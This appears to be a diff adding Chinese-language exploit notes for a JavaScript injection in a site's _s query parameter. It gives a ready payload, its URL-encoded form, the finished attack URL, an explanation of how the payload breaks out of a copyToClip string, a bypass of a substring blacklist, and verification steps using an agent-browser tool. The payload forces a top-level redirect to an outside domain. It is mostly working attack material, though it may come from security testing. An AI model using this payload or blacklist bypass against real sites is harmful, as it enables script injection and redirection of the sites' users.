@@ -1,0 +1,35 @@
+# 载荷（66 字符，目标域可替换）
+");} };top.location='//www.baidu.com';Page={b:function(a){var z=("
+
+# URL 编码（quote(safe='')）
+%22%29%3B%7D%20%7D%3Btop.location%3D%27%2F%2Fwww.baidu.com%27%3BPage%3D%7Bb%3Afunction%28a%29%7Bvar%20z%3D%28%22
+
+# 成品 URL
+https://<host>/?_s=%22%29%3B%7D%20%7D%3Btop.location%3D%27%2F%2Fwww.baidu.com%27%3BPage%3D%7Bb%3Afunction%28a%29%7Bvar%20z%3D%28%22
+
+# 注入点（hex2bin 解码后的脚本内，每页 1~3 处）
+this.copyToClip("share://<_s>=page_id://<uuid>");
+
+# 跳出结构
+"       闭合 copyToClip 实参字符串
+)       闭合实参括号
+;}      闭合当前方法体 + 分号
+ }      闭合外层 var Page = { ... }
+;       结束 var 语句
+top.location='//www.baidu.com';   顶层执行，解析期即跳
+Page={b:function(a){var z=("       重开合法结构，吞掉后续残余（=page_id://uuid"); 及之后所有方法）
+
+# 黑名单绕过
+后端对 _s 做子串黑名单，命中即整体丢弃该值（不是转义）：
+  (){  x(){  ()=>{  function(){  → 被丢弃
+  function(  → 通过
+  function(a){  → 通过   ← 本载荷用的写法（形参带名，避开字面量 "(){"）
+无长度上限（44/60/64/66 字符均通过）。
+
+# 本地语法自检（必做）
+抽出 hex2bin 解码后的 "var Page = { ... };" 整段，把所有 sink 替换为注入后的形式，node --check 必须通过。
+
+# 浏览器验证（判据只有一条）
+agent-browser open '<URL>' ; agent-browser eval "location.href"
+期望 https://<目标域>/ ；再取 document.title / 目标站特征元素佐证。
+对照：同 URL 换 _s=AA 必须停在落地域。
